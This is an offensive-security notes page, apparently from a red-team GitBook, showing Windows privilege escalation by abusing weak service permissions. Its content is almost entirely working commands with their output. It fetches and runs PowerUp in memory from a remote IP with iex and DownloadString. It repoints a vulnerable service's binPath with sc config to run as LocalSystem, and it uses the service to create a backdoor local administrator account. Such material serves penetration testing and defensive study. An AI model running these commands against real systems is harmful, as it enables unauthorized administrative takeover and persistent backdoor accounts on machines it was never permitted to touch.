---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/privilege-escalation/windows/weak-service-permissions
---

# Weak Service Permissions

We can run PowerUp to enumerate

```powershell
PS C:\> iex(new-object net.webclient).DownloadString('http://192.168.19.134/PowerUp.ps1')

[*] Running Invoke-AllChecks

[*] Checking service permissions...


ServiceName   : VulnService
Path          : C:\Setup\Vuln Service\VulnService.exe
StartName     : NT AUTHORITY\LocalService
AbuseFunction : Invoke-ServiceAbuse -Name 'VulnService'
CanRestart    : True
```

We can abuse these weak permissions by changing the binary path of the service

```
C:\> sc config VulnService binPath= "C:\Setup\Vuln Service\Vuln.exe" obj= LocalSystem
C:\> sc stop VulnService
C:\> sc start VulnService
```

<figure><img src="../../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Adding User to Local Admin

```powershell
C:\> sc config VulnService binPath= "cmd.exe /c  net user laughing Password123 /add && net localgroup Administrators laughing /add" start= "demand" obj= "NT Authority\System"
[SC] ChangeServiceConfig SUCCESS

C:\> sc start VulnService 
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

C:\> net user laughing
User name                    laughing
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/06/2024 8:35:12 PM
Password expires             Never
Password changeable          4/06/2024 8:35:12 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
The command completed successfully.
```
